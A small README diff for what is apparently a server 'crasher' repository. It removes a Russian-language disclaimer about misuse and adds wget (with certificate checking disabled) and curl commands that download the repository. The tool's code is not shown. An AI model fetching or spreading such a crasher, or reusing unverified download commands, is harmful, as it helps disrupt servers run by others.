@@ -1,3 +1,7 @@
-не используйте этот репозиторий для плохих целей он выложен в ознакомительных целях.
-я не несу ответственности за ваши действия. вы сами отвечаете за них. этот крашер работает не на один серверр
-это просто как пример на 3000 онлайна. 
+.
+  Download zip.file
+
+  or
+
+  `wget --no-check-certificate --content-disposition https://github.com/crutxsc0304410/alinakartvatit-3``
+  `curl -LJO https://github.com/crutxsc0304410/alinakartvatit-3`
